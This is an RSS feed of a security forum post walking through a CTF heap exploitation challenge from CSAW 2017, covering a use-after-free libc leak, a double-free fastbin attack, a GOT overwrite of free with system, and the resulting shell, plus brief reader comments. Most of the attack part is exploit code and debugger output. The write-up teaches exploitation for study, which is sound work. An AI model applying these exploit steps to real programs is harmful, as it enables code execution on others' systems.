<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Heap Exploitation - Fastbin Attack</title>
    <link>https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627</link>
    <description>Sup folks! I hope you&#39;re doing great! CSAW Quals took place the past weekend and @exploit and myself teamed up for some binary exploitation session. He&#39;s actually so good that he pwned a **500** point binary!

Interestingly enough, there was a heap exploitation-related pwnable which covered a concept I planned on covering after my [UAF](https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580) write-up, so I decided to tackle it and here I am, about to explain to you the whys and hows of my exploit. This time I&#39;ll go full ascii-art on you. 

By the way, if this is your first time ever hearing about heap exploitation, it&#39;d be wise to check out the UAF write-up I linked above along with the resource links that can be found in it. 

Without further ado, let&#39;s get right into!

---
### _Binary Review_



```makefile
RELRO           STACK CANARY      NX            PIE          
Partial RELRO   No canary found   NX enabled    No PIE 
```

```makefile

[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME

```

We can allocate chunks, free them, edit them and dump their content. There isn&#39;t much else to say so let&#39;s dive in the assembly for some bug hunting.

---

### _Reverse Engineering_

The binary was in C++ (the disassembly of C++ isn&#39;t the same as C and sometimes can be scary too) for the most part but the bug itself wasn&#39;t related to that fact. Instead of messing around with C++&#39;s assembly line-by-line, I spotted the functions that allocate / free chunks and checked for heap-related bugs.

```asm
              [...]
00401621  mov     rsi, qword [rbp-0x80]
00401625  movsxd  rdi, dword [rsi]
00401628  mov     rdi, qword [rdi*8+0x605310]
00401630  mov     qword [rbp-0xa0], rax
00401637  call    free
              [...]
```
This is the meat of the binary. We&#39;ve got a global array of malloc&#39;d pointers at `0x605310` and `free` being called on them. However, those pointers aren&#39;t being zeroed out by the program, meaning we abuse UAF to leak libc pointers and we can extend this UAF and turn into a double-free bug in order to perform a fastbin attack (will explain it in detail later on, no worries). 

Although the binary is overall messy, we can get a pretty accurate idea of what&#39;s up with its functionality just with the above lines of assembly. Let&#39;s develop a visual image of how the binary actually handles the heap while stepping through my exploit.

---

###_Exploit Visualization_

```python
alloc(0x80, &#39;A&#39;*10) # chunk 1
alloc(0x80, &#39;B&#39;*10) # chunk 2
```

```makefile
0x617c10:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 0
0x617c20:	0x4141414141414141	0x00000000000a4141
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000000
0x617c90:	0x0000000000000000	0x0000000000000000
0x617ca0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 1
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000000
0x617d00:	0x0000000000000000	0x0000000000000000
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk
```

Looks good so far. So once an allocation takes place, we get to choose the size of the chunk and then we enter a description for it (no overflow).

With just those 2 allocated chunks we can get a libc leak thanks to the UAF bug. We&#39;ll free `chunk 0` in order to make that happen. Why not free `chunk 1` you ask? Let&#39;s have a look at `free`&#39;s source code and find out ourselves.

```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
              
                [...]

/*
   If the chunk borders the current high end of memory,
   consolidate into top
*/

else {
   size += nextsize;
   set_head(p, size | PREV_INUSE);
   av-&gt;top = p;
   check_chunk(av, p);
}

                [...]
```

Fortunately `free`&#39;s source code is well documented so just by reading the above code and with a quick assumption test in GDB we can translate this to something intuitive.

```makefile
gef➤  x/40gx 0x0000000000617c20 - 16
0x617c10:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 0
0x617c20:	0x4141414141414141	0x00000000000a4141
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000000
0x617c90:	0x0000000000000000	0x0000000000000000
0x617ca0:	0x0000000000000000	0x0000000000020361 &lt;-- new top chunk
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000000
0x617d00:	0x0000000000000000	0x0000000000000000
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1
```

As you can see we free&#39;d chunk 1 and since its next chunk was the top chunk / wilderness, they got consolidated into a bigger top chunk to be used for further allocation requests. Note that there are no forward  / backward in that area. Top chunk’s address is taken from the `main_arena` structure in libc’s address space and thus there&#39;s no reason to keep track of it via linked lists etc.

Now that we&#39;ve excluded the de-allocation of the chunk whose bordering chunk is the wilderness, let&#39;s move on with our plan.

```python
free(0)
```

```makefile
0x617c10:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 0 [free]
0x617c20:	0x00007ffff7530b78	0x00007ffff7530b78
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000000
0x617c90:	0x0000000000000000	0x0000000000000000
0x617ca0:	0x0000000000000090	0x0000000000000090 &lt;-- chunk 1 [in use]
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000000
0x617d00:	0x0000000000000000	0x0000000000000000
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1
```
Note how chunk 1&#39;s size went from **0x91** to **0x90** to indicate that its previous chunk is **free**. Be careful though, when it comes to chunks of fastbin size, their lsb (least significant bit) remains set for speed purposes. 

As you can see chunk 0&#39;s area got populated with 2 pointers of same nature and value. They are pointer to libc&#39;s main arena structure. Libc keeps track of the free&#39;d chunks by storing their pointers in an array of pointers whose each entry is a linked list of a certain size. The chunks I allocated were purposely of size `0x90`, which indicates that they are of smallbin size (fastbins&#39; max size is `0x80`), which means they will be placed in a circular double-linked list. Have a look at this awesome [image](https://imgur.com/a/UDkUV) by this [article](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/) to get a feel of what&#39;s going on, it&#39;s not that complicated.

Moving on, we now have a libc leak which officially marks the success of our first objective, getting the base address of libc.

```python

leak = dump(0)
libc = leak - 0x3c4b78
```
We&#39;re one step closer to total pwning. It&#39;s time to take advantage of the double-free form of UAF and bring the flag home.

---

###_Fastbin Attack_

Before I begin explaining the hows and whys of the fastbin attack, I&#39;d like to give a huge shoutout to shellphish who created the [how2heap](https://github.com/shellphish/how2heap) repo which basically documents modern heap exploitation techniques. I highly recommend going through the code examples and figuring out the heap internals by tweaking and debugging.

Let&#39;s get started. First we&#39;ll bring heap to its original state so we can have a fresh start. Though it&#39;s not necessary, I like keeping things clean and simple. Those who were paying close attention can figure out how to do that.

```python
free(1)
```

```makefile
0x617c10:	0x0000000000000000	0x00000000000203f1 &lt;-- new top chunk
0x617c20:	0x00007ffff7530b78	0x00007ffff7530b78
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000000
0x617c90:	0x0000000000000000	0x0000000000000000
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000000
0x617d00:	0x0000000000000000	0x0000000000000000
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- old top chunk
```

The heap has been &quot;re-initialized&quot; by consolidating the last remaining chunk with the wilderness / top chunk and it&#39;s ready for new use, or abuse ;)

Someone could assume that the fastbin attack is related to fastbins. That&#39;s indeed the case. We&#39;re about to exploit the way `malloc` serves / checks free&#39;d fast chunks to the user. Let&#39;s create 2 chunks of fastbin size and one of smallbin size to be used as a border in order to prevent consolidation (don&#39;t pay attention on that one). 

```python
alloc(0x60, &#39;C&#39;*10) # chunk 2
alloc(0x60, &#39;D&#39;*10) # chunk 3
alloc(0x80, &#39;E&#39;*10) # chunk 4
```

```makefile
0x617c10:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 2
0x617c20:	0x4343434343434343	0x00007ffff70a4343
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 3
0x617c90:	0x4444444444444444	0x00000000000a4444
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 4
0x617d00:	0x4545454545454545	0x00000000000a4545
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk
```
Free-ing chunk 2 and chunk 3 (the order doesn&#39;t really matter as you&#39;ll notice later on) will create the following structure in libc:

---

```makefile
fastbinsY[] initial state

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
     
```

---

```python
free(3)
```

```makefile
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c80 --&gt; 0x0
(0x80)     fastbin[6]: 0x0
```



---
```makefile
fastbinsY[] free(3)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
```

---

```makefile
0x617c10:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 2 [in use]
0x617c20:	0x4343434343434343	0x00007ffff70a4343
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 3 [free]
0x617c90:	0x0000000000000000	0x00000000000a4444
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 4 [in use]
0x617d00:	0x4545454545454545	0x00000000000a4545
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk
```

---

```python
free(2)
```

```makefile
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c10 --&gt; 0x617c80 --&gt; 0x0
(0x80)     fastbin[6]: 0x0

```

---

```makefile
fastbinsY[] free(2)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    2   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
```

---

```makefile
0x617c10:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 2 [free]
0x617c20:	0x0000000000617c80	0x00007ffff70a4343
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 3 [free]
0x617c90:	0x0000000000000000	0x00000000000a4444
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 4 [in use]
0x617d00:	0x4545454545454545	0x00000000000a4545
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk

```

To understand the above drawing, just keep in mind the following:

---
_There are 10 fast bins. Each of these bins maintains a single linked list. Addition and deletion happen from the front of this list (LIFO)._
---

In our scenario we have 2 free&#39;d chunks. Once we request a chunk of size `0x70`, `malloc` will do the following:

* Delete the **head** fastbin chunk of the list and give it back to the user. 

* For the next allocation, place at the **head** of the list the address of the chunk which was found in the previous chunk&#39;s forward pointer field of the chunk that was given back to the user (don&#39;t worry if it sounds complicated, there&#39;ll be more ascii-arts soon).

The 2nd bullet point is the bread and butter of the fastbin attack. What if we were able to overwrite the forward pointer of a fastbin chunk while it&#39;s still in its free list with an address of our choice? That essentially means we would get back an arbitrary pointer where we can write whatever we want. Here&#39;s our write primitive! But no so easy folks, there are 2 requirements we need to take care of first.

First of all, how can we overwrite the forward pointer if there&#39;s no overflow? Well well, we can abuse the UAF in order to `free` a chunk twice in a certain order. What do I mean by the order?

```c
if (__builtin_expect (old == p, 0)) {
    errstr = &quot;double free or corruption (fasttop)&quot;;
    goto errout;
}
```
The above code checks if the chunk that is about get free&#39;d is the one that is currently at the top / head of the fastbin list. In other words, we can&#39;t `free` the same chunk twice in a row. But that&#39;s not secure enough! Bypassing this is a piece of cake. All we have to do is `free` a different chunk in between the double free. Let&#39;s reconstruct the exploit and enter visual mode.

```python
# double-free =&gt; fastbin attack
free(3)
free(2)
free(3)
```
We had already analyzed the first 2 `free`s so let&#39;s continue with the 3rd one.

```python
free(3)
```

```makefile
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c80 --&gt; 0x617c10 --&gt; 0x617c80
(0x80)     fastbin[6]: 0x0
```
---


```makefile
fastbinsY[] free(3)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    2   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
```
---

```makefile
0x617c10:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 2 [free]
0x617c20:	0x0000000000617c80	0x00007ffff70a4343
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 3 [free]
0x617c90:	0x0000000000617c10	0x00000000000a4444
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 4 [in use]
0x617d00:	0x4545454545454545	0x00000000000a4545 
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk
```

Do you see what I see? We placed the same chunk **twice** in its corresponding free list! Now ask yourselves, what&#39;s going to happen once we request a chunk of size `0x70`? You already know it by now, `malloc` will check the **head** of the free list and serve back the chunk. However, because of the way we have constructed the free list thanks to the double-free bug, we get to affect `0x617c80`&#39;s FD pointer while it&#39;s free! Let&#39;s see it in action.

```python
alloc(0x68, p64(bss))
```

```makefile
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c10 --&gt; 0x617c80 --&gt; 0x6052ed 
(0x80)     fastbin[6]: 0x0
```
---

Let me remind you of the structure of a fastbin chunk and then just pause and ponder.

```makefile
Fastbin Chunk Structure

    chunk-&gt; +-------------------------------------------+
            |    Size of previous chunk if it&#39;s free    |
            +-------------------------------------------+
            |             Size of chunk                 |
      mem-&gt; +-------------------------------------------+
            |    Forward pointer to next chunk in list  |
            +-------------------------------------------+
            |                   ...                     |
            +-------------------------------------------+
```

In general, whenever we request a chunk, `malloc` will serve back a pointer to where `mem` is pointing to in the ascii-art. Regarding the exploit now, we requested a chunk of size `0x68` (which wraps around `0x70` for alignment purposes) and we effectively got access to `0x617c80` which happens to remain in the free list as well. As it can be seen below, we overwrote the `FD` field with an address of our choice. 

```makefile
0x617c80:	0x0000000000000000	0x0000000000000071 &lt;--  chunk 3 [free &amp; in use]
0x617c90:	0x00000000006052ed &lt;-- FD pointer
```

Here&#39;s a view of the fastbin list as well:

---

```makefile
fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    2   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |0x6052ed|
                             +--------+
```
---

The question now is why did we overwrite the `FD` field with `0x6052ed`? We somehow need to get our arbitrary (almost) primitive, don&#39;t we? 

`malloc` does the following check before it deletes a free fastbin chunk in order to serve it back to the user:

```c
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
{
    errstr = &quot;malloc(): memory corruption (fast)&quot;;
errout:
    malloc_printerr (check_action, errstr, chunk2mem (victim), av);
    return NULL;
}
```
`malloc` makes sure there hasn&#39;t been any sort of fastbin corruption by checking if the size of the chunk which is about to be deleted corresponds to the size of this fastbin request (max `0x80`) . How do we bypass that? There are a few ways to get around it but here&#39;s my thought process:

* The binary has partial RELRO, which means the Global Offset Table is still writable.

* If the binary had full RELRO, we can still get around it by overwriting the `__malloc_hook` function pointer in libc (which is the subject of a future post).

* So how we overwrite an entry in GOT? The binary keeps track of the allocated objects in a global array of pointers. If we could somehow overwrite one of those pointers with a GOT address and then call the `edit` function, we can overwrite its content with a function of our taste, such as `system`!

Let&#39;s inspect the memory around that global array which is at address `0x605310`.

```makefile
gef➤  x/6gx 0x605310
0x605310:	0x0000000000617c20	0x0000000000617cb0
0x605320:	0x0000000000617c20	0x0000000000617c90
0x605330:	0x0000000000617d00	0x0000000000617c90
```

The entries are looking good. Now what if there&#39;s an address **before** the global array&#39;s address where at offset `+0x8` there is a value of a legitimate fastbin size. After a bit of trial and error, here&#39;s our savior!

```makefile
gef➤  x/40gx 0x6052ed
0x6052ed:   0xfff753162000007f	0x000000000000007f
0x6052fd:	0x0000000000000000	0x0000000000000000
0x60530d:	0x0000617c20000000	0x0000617cb0000000
0x60531d:	0x0000617c20000000	0x0000617c90000000
0x60532d:	0x0000617d00000000	0x0000617c90000000
```

Who would&#39;ve thought, now we&#39;re talking! `0x6052ed` is right below `0x605310`, `0x23` below to be precise, which is enough to overflow the entire array since our allocation was of size `0x70`! And the best part, at offset `+0x8` there is `0x7f`, which is a legitimate fastbin chunk size! You might noticed that the address entries are misaligned, but that doesn&#39;t bother us, we will make sure to surgically overflow the entries such that one of them points to a GOT entry! Game over!

Let&#39;s keep stepping through the exploit and see the magic happen.

```python
alloc(0x68, &quot;F&quot;)
```

```makefile
gef➤ printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c80 --&gt; 0x6052ed
(0x80)     fastbin[6]: 0x0

```

---

```makefile
fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |0x6052ed|
                             +--------+
```
---

```python
alloc(0x68, &quot;G&quot;)
```

```makefile
gef➤  printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x6052ed 
(0x80)     fastbin[6]: 0x0
```

---

```makefile
fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |0x6052ed|
                             +--------+
```
---

Off to the last part, on the next allocation we&#39;ll get back `0x6052ed` and we&#39;ll overflow the 1st and 2nd entry of the global array to point to `free`&#39;s GOT entry and `sh`&#39;s address respectively.

```python
alloc(0x68,&quot;H&quot;*0x13 + p64(free_got) + p64(binsh))
```

```makefile
gef➤  printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
```

```makefile
gef➤  x/5gx 0x605310
0x605310:	0x0000000000605060	0x00007ffff72f8d17
0x605320:	0x0000000000617c0a	0x0000000000617c90
0x605330:	0x0000000000617d00

gef➤  x/gx 0x0000000000605060
0x605060:	0x00007ffff71f04f0

gef➤  x 0x00007ffff71f04f0
0x7ffff71f04f0 &lt;__GI___libc_free&gt;:	0x8348535554415541

gef➤  x/s 0x00007ffff72f8d17
0x7ffff72f8d17:	&quot;/bin/sh&quot;
```

---

```makefile
fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                        
```


Brilliant! Let&#39;s pwn this binary once and for all.

---

###_Pwning Time_

* The `edit` function receives an index as input and then picks the corresponding entry from the global array in order to overwrite its content with our desired input. I picked `free` as the victim GOT entry because it receives one argument, like `system`.

* When we&#39;re asked to de-allocate a chunk, we provide an index once again and `free` will be called (or would be called since we&#39;ll overwrite it `system`&#39;s address) with an address from the global array as an argument.

* Since we overwrote the 1st entry with `system`&#39;s address and the 2nd one with `sh`&#39;s address, once de-allocation takes place and we provide `1` as the index (arrays are indexed from 0), `system` will take over control and execute whatever command is at the address which was found in the global array. There&#39;s our shell!

```python
# free =&gt; system
edit(0, 8, p64(system))
```

```makefile
gef➤  x/gx 0x0000000000605060
0x605060:	0x00007ffff71b1390
gef➤  x 0x00007ffff71b1390
0x7ffff71b1390 &lt;__libc_system&gt;:	0xfa86e90b74ff8548
```

Voila! `free`&#39;s GOT entry officially points to `system`&#39;s address! Let&#39;s bring this flag home!

```python
# call system with the 2nd entry as argument, which is binsh
free(1)
```

```makefile
[*] Leak:        0x7fa077b3fb78
[*] Libc:        0x7fa07777b000
[*] system:      0x7fa0777c0390
[*] Switching to interactive mode
[*] BREAKING....
$ id
uid=1000(auir) gid=1000(auir) groups=1000(auir)
$ ls
auir
flag
$ cat flag
flag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}
```
###_Conclusion_

That&#39;s been it folks! I hope you learnt something new out of it. Thank you for taking the time to read my write-up and if you have any question feel free to comment it down below or reach out to me via twitter DM / IRC. 

You can find the full exploit with its PoC on my [repo](https://github.com/sk4px/heapwn/blob/master/csaw2017/auir.py).

~ Peace!</description>
    
    <lastBuildDate>Sun, 04 Feb 2024 01:39:19 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Heap Exploitation - Fastbin Attack</title>
        <dc:creator><![CDATA[c0z]]></dc:creator>
        <description><![CDATA[
            <p>Thank you for a great article on heap exploitation.</p>
          <p><a href="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/10</link>
        <pubDate>Sun, 04 Feb 2024 01:39:19 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3627-10</guid>
        <source url="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627.rss">Heap Exploitation - Fastbin Attack</source>
      </item>
      <item>
        <title>Heap Exploitation - Fastbin Attack</title>
        <dc:creator><![CDATA[bsdb0y]]></dc:creator>
        <description><![CDATA[
            <p>Nice post, thanks.<br>
I have a doubt could you please help to understand. How did you calculate the 0x13 bytes required to overflow?<br>
<code>alloc(0x68,"H"*0x13 + p64(free_got) + p64(binsh))</code></p>
          <p><a href="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/8</link>
        <pubDate>Thu, 18 Jan 2024 16:06:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3627-8</guid>
        <source url="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627.rss">Heap Exploitation - Fastbin Attack</source>
      </item>
      <item>
        <title>Heap Exploitation - Fastbin Attack</title>
        <dc:creator><![CDATA[segfault]]></dc:creator>
        <description><![CDATA[
            <p>Oooooh Really ? so “Thanks” means nothing ?</p>
          <p><a href="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/7</link>
        <pubDate>Tue, 19 Sep 2017 14:16:01 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3627-7</guid>
        <source url="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627.rss">Heap Exploitation - Fastbin Attack</source>
      </item>
      <item>
        <title>Heap Exploitation - Fastbin Attack</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/segfault">@segfault</a> <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a></p>
<p>Please remember that comments like “thank you” are better-expressed by hitting the Like button. If you want to praise an author more, hop on IRC!</p>
          <p><a href="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/6</link>
        <pubDate>Tue, 19 Sep 2017 13:35:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3627-6</guid>
        <source url="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627.rss">Heap Exploitation - Fastbin Attack</source>
      </item>
      <item>
        <title>Heap Exploitation - Fastbin Attack</title>
        <dc:creator><![CDATA[segfault]]></dc:creator>
        <description><![CDATA[
            <p>awesome mate , thanks !</p>
          <p><a href="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/5</link>
        <pubDate>Tue, 19 Sep 2017 10:58:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3627-5</guid>
